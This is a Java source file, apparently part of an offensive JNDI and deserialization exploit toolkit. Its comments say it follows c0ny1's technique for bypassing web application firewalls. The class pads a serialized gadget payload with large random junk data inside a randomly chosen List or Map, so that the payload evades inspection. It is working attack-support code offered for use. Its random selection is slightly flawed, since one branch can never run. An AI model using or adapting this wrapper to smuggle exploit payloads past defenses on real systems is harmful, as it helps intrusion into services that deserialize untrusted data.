package com.nu1r.jndi.gadgets.utils.dirty;

import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

/**
 * 来自 c0ny1
 * <p>
 * Java反序列化数据绕WAF之加大量脏数据
 * 链接：https://gv7.me/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/
 */
public class DirtyDataWrapper {

    // 脏数据大小
    private final int dirtyDataSize;

    // gadget 对象
    private final Object gadget; //  gadget对象

    public DirtyDataWrapper(Object gadget, int dirtyDataSize) {
        this.gadget = gadget;
        this.dirtyDataSize = dirtyDataSize;
    }

    /**
     * 随机使用 ArrayList/LinkedList/HashMap/LinkedHashMap/TreeMap 来封装 object，并指定脏数据大小
     *
     * @return 返回包裹后的反序列化数据
     */
    public Object doWrap() {

        // 如果混淆长度为 0 则不混淆
        if (dirtyDataSize == 0) {
            return gadget;
        }

        Object wrapper = null;
        // 生成随机字符串
        String dirtyData = new RandomString((dirtyDataSize), ThreadLocalRandom.current()).getString();
        // 随机选择封装对象
        int type = (int) (Math.random() * 10) % 10 + 1;
        switch (type) {
            case 0:
                List<Object> arrayList = new ArrayList<Object>();
                arrayList.add(dirtyData);
                arrayList.add(gadget);
                wrapper = arrayList;
                break;
            case 1:
                List<Object> linkedList = new LinkedList<Object>();
                linkedList.add(dirtyData);
                linkedList.add(gadget);
                wrapper = linkedList;
                break;
            case 2:
                HashMap<String, Object> map = new HashMap<String, Object>();
                map.put("su18", dirtyData);
                map.put("su19", gadget);
                wrapper = map;
                break;
            case 3:
                LinkedHashMap<String, Object> linkedHashMap = new LinkedHashMap<String, Object>();
                linkedHashMap.put("su18", dirtyData);
                linkedHashMap.put("su19", gadget);
                wrapper = linkedHashMap;
                break;
            default:
            case 4:
                TreeMap<String, Object> treeMap = new TreeMap<String, Object>();
                treeMap.put("su18", dirtyData);
                treeMap.put("su19", gadget);
                wrapper = treeMap;
                break;
        }
        return wrapper;
    }

}
